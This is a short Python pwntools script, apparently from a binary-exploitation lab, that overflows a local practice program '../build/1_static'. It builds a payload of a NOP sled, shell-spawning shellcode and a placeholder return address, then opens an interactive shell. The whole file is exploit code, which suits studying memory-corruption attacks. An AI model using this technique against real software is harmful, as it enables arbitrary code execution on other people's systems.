#!/usr/bin/python
from pwn import *
# Define the context of the working machine
context(arch='i386', os='linux')

def main():
    # Start the process
    log.info("Launching the process")
    p = process("../build/1_static")

    # Get a simple shellcode
    log.info("Putting together simple shellcode")
    shellcode = asm(shellcraft.sh())
    # print(len(shellcode))
    print(asm(shellcraft.sh()))

    # Craft the payload
    log.info("Crafting the payload")
    # payload = "A"*148
    payload = "\x90"*86    # no op code
    payload += shellcode   # 44 chars
    payload += "\x90"*18    # no op code
    payload += p32(0xdeadc0de)
    # payload += "\x90"*500    # no op code
    payload = payload.ljust(2000, "\x00")
    # log.info(payload)

    # Print the process id
    raw_input(str(p.proc.pid))

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
